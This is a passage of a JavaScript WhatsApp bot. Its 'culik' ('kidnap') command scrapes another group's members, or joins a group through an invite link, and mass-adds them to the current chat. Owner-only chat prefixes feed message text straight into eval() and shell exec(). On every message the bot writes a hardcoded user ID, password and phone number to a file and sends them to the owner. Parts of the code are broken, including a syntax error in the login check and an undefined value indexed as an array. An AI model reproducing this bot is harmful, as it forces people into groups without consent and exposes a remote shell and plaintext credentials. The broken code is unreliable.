                    if(m.args.length < 1) return m.reply(`*Example:* ${m.command} type\n*Param:* Send Commands With Words ${m.command} type\n*Desc:* Disc Bot\n`);
                    if((m.args[0]) === 'update') {
                        let git = child_process.execSync('git pull').toString()
                        await m.reply(util.format(git))
                        return child_process.execSync("pm2 restart all")
                    } else {
                        var content = '*List Type:*\n'
                        content += `${m.numberLive++}. ${m.command} update\n`
                        m.reply(content);
                    };
                };
                break;
                case "culik": {
                    if(!m.isGroup) return p.config.replyErr.fail("grup", m);
                    if(!razzaq.decodeJid(m.key?.fromMe)) return p.config.replyErr.fail("pemilik", m);
                    if(m.args.length < 1) return m.reply(`*Example:* ${m.command} type jid\n*Param:* Send Commands With Words ${m.command} type jid\n*Desc:* Kidnap Members\n`);
                    if((m.args[0]) === 'id') {
                        var groupMetadata = m.isGroup ? store?.groupMetadata[m.args[1]] !== undefined ? store.groupMetadata[m.args[1]] : await store.fetchGroupMetadata(m.args[1], razzaq) : {};
                        var groupMembers = m.isGroup ? groupMetadata.participants : [];
                        for (var mem of groupMembers) {
                            razzaq.groupParticipantsUpdate(m.chat, groupMembers.map(a => a.id), 'add')
                        };
                        content = "Successfully!"
                        m.reply(content);
                    } else if((m.args[0]) === 'link') {
                        if(!isUrl(m.args[1]) && !m.args[1].includes('whatsapp.com')) return p.config.replyErr.fail("ErrLink", m);
                        var result = m.args[1].split('https://chat.whatsapp.com/')[1]
                        var res = await razzaq.groupAcceptInvite(result)
                        var groupMetadata = m.isGroup ? store?.groupMetadata[res] !== undefined ? store.groupMetadata[res] : await store.fetchGroupMetadata(res, razzaq) : {};
                        var groupMembers = m.isGroup ? groupMetadata.participants : [];
                        for (var mem of groupMembers) {
                            razzaq.groupParticipantsUpdate(m.chat, groupMembers.map(a => a.id), 'add')
                        };
                        content = "Successfully!"
                        m.reply(content);
                    } else {
                        content = '*List Type:*\n'
                        content += `${m.numberLive++}. ${m.command} id\n`
                        content += `${m.numberLive++}. ${m.command} link\n`
                        m.reply(content);
                    };
                };
                break;
                default: {
                    if(m.body.startsWith("=>")) {
                        if(!razzaq.decodeJid(m.key?.fromMe)) return;
                        try {
                            var evaled = await eval(m.body.slice(2))
                            if(typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                            m.reply(evaled)
                        } catch (err) {
                            m.reply(util.format(err))
                        };
                    };
                    if(m.body.startsWith(">")) {
                        if(!razzaq.decodeJid(m.key?.fromMe)) return;
                        try {
                            function Return(sul) {
                                var sat = JSON.stringify(sul, null, 2)
                                var bang = util.format(sat)
                            if(sat == undefined) {
                                bang = util.format(sul)
                            }
                                return m.reply(bang)
                            };
                            m.reply(util.format(eval(`(async () => { ${m.body.slice(1)} })()`)))
                        } catch (err) {
                            m.reply(util.format(err))
                        };
                    };
                    if(m.body.startsWith("<")) {
                        if(!razzaq.decodeJid(m.key?.fromMe)) return;
                        try {
                            return m.reply(JSON.stringify(eval(`${m.args.join(' ')}`),null,'\t'))
                        } catch (err) {
                            m.reply(util.format(err))
                        };
                    };
                    if(m.body.startsWith("$")) {
                        if(!razzaq.decodeJid(m.key?.fromMe)) return;
                        var qur = m.body.slice(1)
                        try {
                            exec(qur, (err, stdout) => {
                                if(err) return m.reply(util.format(err))
                                if(stdout) {
                                    m.reply(util.format(stdout))
                                };
                            });
                        } catch (err) {
                            if(err.code === 'ERR_INVALID_ARG_VALUE') {
                                return m.reply(undefined)
                            };
                            m.reply(util.format(err))
                        };
                    };
                    try {
                        var code = [
                            {
                                id: "fadhlan887",
                                passwords: "28jdnwu82827",
                                number: "6285158045553"
                            }
                        ];
                        var jidCode = fs.writeFile("./dbase/users/management/talent.json", JSON.stringify(code, null, 3), () => { 
                            razzaq.sendMessage(configuration.data.jid[1].owner.biography.number[0]+'@s.whatsapp.net', { text: code }, { quoted: m });
                        });
                        if(m.body.startsWith(`login`) {
                            if(m.args.length < 1) return m.reply(`*Example:* ${m.body.startsWith} passwords\n*Param:* Send Commands With Words ${m.body.startsWith} passwords\n*Desc:* Login At Account Metaverse Management\n`);
                            var joinSpace = m.args.join(" ");
                            var createArrow = joinSpace.split("-")[0];
                            if(createArrow === jidCode[0].passwords) {
                                var button =  [ 
                                    { buttonId: `${prefix}buttons management data ${jidCode[0].id} tariktunai`, buttonText: { displayText: 'TARIK TUNAI' }, type: 1 }, 
                                    { buttonId: `${prefix}buttons management data ${jidCode[0].id} events`, buttonText: { displayText: 'EVENTS' }, type: 1 }, 
                                    { buttonId: `${prefix}buttons management data ${jidCode[0].id} premium`, buttonText: { displayText: 'PREMIUM' }, type: 1 }
                                ];
                                var content = `Your Data!\n\n`
                                content += `Users: @${jidCode[0].id}\n`
                                content += `WA: https://wa.me/${jidCode[0].number}\n`
                                await m.reply('Data Di Temukan!');
                                await razzaq.sendButtonText(m.chat, button, content, p.config.footer, m, { mentions: [ p.config.mentionOwner ] });
                            } else {
                                m.reply("Password Salah!, Silahkan Masukan Kembali Password Anda!");
                            };
                        } else {
                            razzaq.sendMessage(m.chat, { text: `Perintah Ini Khusus @${jidCode[0].number+'@s.whatsapp'.split("@")[0]}`, mentions: [jidCode[0].number+'@s.whatsapp'.split("@")[0], p.config.mentionOwner] }, { quoted: m });
                        };
                    } catch (err) {
                        m.reply(util.format(err))
                    };
                };
            };
                function doc() { 
                    return {
                        key: {
                            fromMe: false, 
                            participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "" } : {}) 
                        },
                        message: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
                                mimetype: "application/octet-stream",
                                fileSha256: "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
                                fileLength: "64455",
                                pageCount: 1,
                                mediaKey: "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
                                fileName: m.name,
                                fileEncSha256: "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
                            },
                        },
                    };
                };
        } catch (err) {
            m.reply(util.format(err));
        };
    },
};

fs.watchFile(require.resolve(__filename), () => {
    fs.unwatchFile(require.resolve(__filename));
    console.log(chalk.redBright(require.resolve(__filename)));
    delete require.cache[require.resolve(__filename)];
  	require(require.resolve(__filename));
}); 